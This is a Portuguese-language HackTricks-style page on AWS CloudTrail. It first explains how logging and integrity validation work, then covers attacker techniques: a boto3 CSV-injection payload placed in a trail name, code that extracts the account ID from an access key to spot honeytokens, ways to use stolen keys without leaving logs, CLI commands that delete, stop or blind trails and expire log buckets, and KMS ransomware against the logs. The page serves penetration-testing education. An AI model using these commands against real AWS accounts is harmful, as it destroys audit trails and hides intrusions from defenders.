# AWS - CloudTrail Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **registra e monitora a atividade dentro do seu ambiente AWS**. Ele captura **logs de eventos** detalhados, incluindo quem fez o qu√™, quando e de onde, para todas as intera√ß√µes com os recursos AWS. Isso fornece um hist√≥rico de auditoria de mudan√ßas e a√ß√µes, auxiliando na an√°lise de seguran√ßa, auditoria de conformidade e rastreamento de mudan√ßas de recursos. O CloudTrail √© essencial para entender o comportamento de usu√°rios e recursos, melhorar posturas de seguran√ßa e garantir conformidade regulat√≥ria.

Cada evento registrado cont√©m:

* O nome da API chamada: `eventName`
* O servi√ßo chamado: `eventSource`
* O tempo: `eventTime`
* O endere√ßo IP: `SourceIPAddress`
* O m√©todo do agente: `userAgent`. Exemplos:
* Signing.amazonaws.com - Do AWS Management Console
* console.amazonaws.com - Usu√°rio root da conta
* lambda.amazonaws.com - AWS Lambda
* Os par√¢metros da solicita√ß√£o: `requestParameters`
* Os elementos da resposta: `responseElements`

Os eventos s√£o escritos em um novo arquivo de log **aproximadamente a cada 5 minutos em um arquivo JSON**, eles s√£o mantidos pelo CloudTrail e, finalmente, os arquivos de log s√£o **entregues ao S3 aproximadamente 15 minutos depois**.\
Os logs do CloudTrail podem ser **agregados entre contas e entre regi√µes.**\
O CloudTrail permite usar **a integridade do arquivo de log para poder verificar se seus arquivos de log permaneceram inalterados** desde que o CloudTrail os entregou a voc√™. Ele cria um hash SHA-256 dos logs dentro de um arquivo de digest√£o. Um hash sha-256 dos novos logs √© criado a cada hora.\
Ao criar um Trail, os seletores de eventos permitir√£o que voc√™ indique o trail a ser registrado: eventos de gerenciamento, dados ou insights.

Os logs s√£o salvos em um bucket S3. Por padr√£o, a Criptografia do Lado do Servidor √© usada (SSE-S3), ent√£o a AWS descriptografa o conte√∫do para as pessoas que t√™m acesso a ele, mas para seguran√ßa adicional, voc√™ pode usar SSE com KMS e suas pr√≥prias chaves.

Os logs s√£o armazenados em um **bucket S3 com este formato de nome**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* Sendo o BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Exemplo: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Dentro de cada pasta, cada log ter√° um **nome seguindo este formato**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

Log File Naming Convention

![](<../../../../.gitbook/assets/image (122).png>)

Al√©m disso, **arquivos de digest√£o (para verificar a integridade do arquivo)** estar√£o dentro do **mesmo bucket** em:

![](<../../../../.gitbook/assets/image (195).png>)

### Agregar Logs de M√∫ltiplas Contas

* Crie um Trail na conta AWS onde voc√™ deseja que os arquivos de log sejam entregues
* Aplique permiss√µes ao bucket S3 de destino permitindo acesso entre contas para o CloudTrail e permita que cada conta AWS que precisa de acesso
* Crie um novo Trail nas outras contas AWS e selecione usar o bucket criado na etapa 1

No entanto, mesmo que voc√™ possa salvar todos os logs no mesmo bucket S3, n√£o √© poss√≠vel agregar logs do CloudTrail de v√°rias contas em um CloudWatch Logs pertencente a uma √∫nica conta AWS.

{% hint style="danger" %}
Lembre-se de que uma conta pode ter **diferentes Trails** do CloudTrail **ativados** armazenando os mesmos (ou diferentes) logs em diferentes buckets.
{% endhint %}

### Cloudtrail de todas as contas da org em 1

Ao criar um CloudTrail, √© poss√≠vel indicar para ativar o cloudtrail para todas as contas na org e obter os logs em apenas 1 bucket:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Dessa forma, voc√™ pode facilmente configurar o CloudTrail em todas as regi√µes de todas as contas e centralizar os logs em 1 conta (que voc√™ deve proteger).

### Verifica√ß√£o de Arquivos de Log

Voc√™ pode verificar se os logs n√£o foram alterados executando

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### Logs para CloudWatch

**CloudTrail pode enviar logs automaticamente para o CloudWatch, permitindo que voc√™ configure alertas que o avisem quando atividades suspeitas forem realizadas.**\
Observe que, para permitir que o CloudTrail envie os logs para o CloudWatch, uma **role** precisa ser criada que permita essa a√ß√£o. Se poss√≠vel, √© recomend√°vel usar a role padr√£o da AWS para realizar essas a√ß√µes. Essa role permitir√° que o CloudTrail:

* CreateLogStream: Isso permite criar streams de log do CloudWatch Logs
* PutLogEvents: Entregar logs do CloudTrail para o stream de log do CloudWatch Logs

### Hist√≥rico de Eventos

O Hist√≥rico de Eventos do CloudTrail permite que voc√™ inspecione em uma tabela os logs que foram registrados:

![](<../../../../.gitbook/assets/image (89).png>)

### Insights

**CloudTrail Insights** automaticamente **analisa** eventos de gerenciamento de escrita dos trilhos do CloudTrail e **avisa** voc√™ sobre **atividades incomuns**. Por exemplo, se houver um aumento nos eventos `TerminateInstance` que difere das linhas de base estabelecidas, voc√™ ver√° isso como um evento de Insight. Esses eventos tornam **mais f√°cil do que nunca encontrar e responder a atividades incomuns de API**.

Os insights s√£o armazenados no mesmo bucket que os logs do CloudTrail em: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### Seguran√ßa

| Integridade do Arquivo de Log do CloudTrail | <ul><li>Validar se os logs foram adulterados (modificados ou exclu√≠dos)</li><li><p>Usa arquivos de digest√£o (cria hash para cada arquivo)</p><ul><li>Hashing SHA-256</li><li>SHA-256 com RSA para assinatura digital</li><li>chave privada de propriedade da Amazon</li></ul></li><li>Leva 1 hora para criar um arquivo de digest√£o (feito a cada hora)</li></ul> |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Impedir acesso n√£o autorizado                 | <ul><li><p>Usar pol√≠ticas IAM e pol√≠ticas de bucket S3</p><ul><li>equipe de seguran√ßa ‚Äî> acesso administrativo</li><li>auditores ‚Äî> acesso somente leitura</li></ul></li><li>Usar SSE-S3/SSE-KMS para criptografar os logs</li></ul>                                                                                                                                        |
| Prevenir a exclus√£o de arquivos de log       | <ul><li>Restringir acesso de exclus√£o com pol√≠ticas IAM e de bucket</li><li>Configurar exclus√£o MFA do S3</li><li>Validar com Valida√ß√£o de Arquivo de Log</li></ul>                                                                                                                                                                                            |

## Consultor de Acesso

O Consultor de Acesso da AWS depende dos √∫ltimos 400 dias de logs do **CloudTrail da AWS para reunir suas percep√ß√µes**. O CloudTrail captura um hist√≥rico das chamadas de API da AWS e eventos relacionados feitos em uma conta da AWS. O Consultor de Acesso utiliza esses dados para **mostrar quando os servi√ßos foram acessados pela √∫ltima vez**. Ao analisar os logs do CloudTrail, o Consultor de Acesso pode determinar quais servi√ßos da AWS um usu√°rio ou role IAM acessou e quando esse acesso ocorreu. Isso ajuda os administradores da AWS a tomar decis√µes informadas sobre **refinar permiss√µes**, pois podem identificar servi√ßos que n√£o foram acessados por longos per√≠odos e potencialmente reduzir permiss√µes excessivamente amplas com base em padr√µes de uso reais.

{% hint style="success" %}
Portanto, o Consultor de Acesso informa sobre **as permiss√µes desnecess√°rias sendo concedidas aos usu√°rios** para que o administrador possa remov√™-las.
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## A√ß√µes

### Enumera√ß√£o
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **Inje√ß√£o CSV**

√â poss√≠vel realizar uma inje√ß√£o CSV dentro do CloudTrail que executar√° c√≥digo arbitr√°rio se os logs forem exportados em CSV e abertos com o Excel.\
O seguinte c√≥digo gerar√° uma entrada de log com um nome de Trail ruim contendo a carga √∫til:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Para mais informa√ß√µes sobre Inje√ß√µes CSV, consulte a p√°gina:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Para mais informa√ß√µes sobre esta t√©cnica espec√≠fica, consulte [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **Bypass Detection**

### HoneyTokens **bypass**

Honeytokens s√£o criados para **detectar a exfiltra√ß√£o de informa√ß√µes sens√≠veis**. No caso da AWS, eles s√£o **chaves da AWS cujo uso √© monitorado**, se algo acionar uma a√ß√£o com essa chave, ent√£o algu√©m deve ter roubado essa chave.

No entanto, Honeytokens como os criados por [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) est√£o usando nomes de conta reconhec√≠veis ou usando o mesmo ID de conta da AWS para todos os seus clientes. Portanto, se voc√™ conseguir obter o nome da conta e/ou ID da conta sem fazer o Cloudtrail criar nenhum log, **voc√™ poderia saber se a chave √© um honeytoken ou n√£o**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57) tem algumas regras para detectar se uma chave pertence a [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* Se **`canarytokens.org`** aparecer no nome da fun√ß√£o ou o ID da conta **`534261010715`** aparecer na mensagem de erro.
* Testando-os mais recentemente, eles est√£o usando a conta **`717712589309`** e ainda tem a string **`canarytokens.com`** no nome.
* Se **`SpaceCrab`** aparecer no nome da fun√ß√£o na mensagem de erro
* **SpaceSiren** usa **uuids** para gerar nomes de usu√°rio: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* Se o **nome parecer gerado aleatoriamente**, h√° altas probabilidades de que seja um HoneyToken.

#### Obter o ID da conta a partir do ID da chave

Voc√™ pode obter o **ID da Conta** a partir do **codificado** dentro da **chave de acesso** como [**explicado aqui**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) e verificar o ID da conta com sua lista de contas Honeytokens da AWS:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Confira mais informa√ß√µes na [**pesquisa original**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### N√£o gerar um log

A t√©cnica mais eficaz para isso √©, na verdade, uma simples. Basta usar a chave que voc√™ acabou de encontrar para acessar algum servi√ßo dentro da sua pr√≥pria conta de atacante. Isso far√° com que **o CloudTrail gere um log dentro da SUA PR√ìPRIA conta AWS e n√£o dentro da conta das v√≠timas**.

A quest√£o √© que a sa√≠da mostrar√° um erro indicando o ID da conta e o nome da conta, ent√£o **voc√™ poder√° ver se √© um Honeytoken**.

#### Servi√ßos AWS sem logs

No passado, havia alguns **servi√ßos AWS que n√£o enviavam logs para o CloudTrail** (encontre uma [lista aqui](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Alguns desses servi√ßos **responder√£o** com um **erro** contendo o **ARN do papel da chave** se algu√©m n√£o autorizado (a chave honeytoken) tentar acess√°-lo.

Dessa forma, um **atacante pode obter o ARN da chave sem acionar nenhum log**. No ARN, o atacante pode ver o **ID da conta AWS e o nome**, √© f√°cil saber o ID e os nomes das contas das empresas do HoneyToken, assim um atacante pode identificar se o token √© um HoneyToken.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
Observe que todas as APIs p√∫blicas descobertas que n√£o estavam criando logs do CloudTrail agora foram corrigidas, ent√£o talvez voc√™ precise encontrar as suas pr√≥prias...

Para mais informa√ß√µes, consulte a [**pesquisa original**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/).
{% endhint %}

### Acessando Infraestrutura de Terceiros

Certos servi√ßos AWS **gerar√£o alguma infraestrutura** como **Bancos de Dados** ou **clusters Kubernetes** (EKS). Um usu√°rio **falando diretamente com esses servi√ßos** (como a API do Kubernetes) **n√£o usar√° a API AWS**, ent√£o o CloudTrail n√£o poder√° ver essa comunica√ß√£o.

Portanto, um usu√°rio com acesso ao EKS que descobriu a URL da API do EKS poderia gerar um token localmente e **falar com o servi√ßo da API diretamente sem ser detectado pelo Cloudtrail**.

Mais informa√ß√µes em:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### Modificando a Configura√ß√£o do CloudTrail

#### Excluir trilhas
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Parar trilhas
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Desativar o registro em v√°rias regi√µes

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Desativar Registro por Seletores de Evento

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

No primeiro exemplo, um √∫nico seletor de eventos √© fornecido como um array JSON com um √∫nico objeto. O `"ReadWriteType": "ReadOnly"` indica que o **seletor de eventos deve capturar apenas eventos de leitura** (ent√£o as percep√ß√µes do CloudTrail **n√£o estar√£o verificando eventos de escrita**, por exemplo).

Voc√™ pode personalizar o seletor de eventos com base em seus requisitos espec√≠ficos.

#### Exclus√£o de logs via pol√≠tica de ciclo de vida do S3

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Modificando a Configura√ß√£o do Bucket

* Excluir o bucket S3
* Alterar a pol√≠tica do bucket para negar quaisquer grava√ß√µes do servi√ßo CloudTrail
* Adicionar pol√≠tica de ciclo de vida ao bucket S3 para excluir objetos
* Desativar a chave KMS usada para criptografar os logs do CloudTrail

### Ransomware do Cloudtrail

#### Ransomware S3

Voc√™ poderia **gerar uma chave assim√©trica** e fazer o **CloudTrail criptografar os dados** com essa chave e **deletar a chave privada** para que o conte√∫do do CloudTrail n√£o possa ser recuperado.\
Isso √© basicamente um **ransomware S3-KMS** explicado em:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**Ransomware KMS**

Esta √© uma maneira mais f√°cil de realizar o ataque anterior com diferentes requisitos de permiss√µes:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Refer√™ncias**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
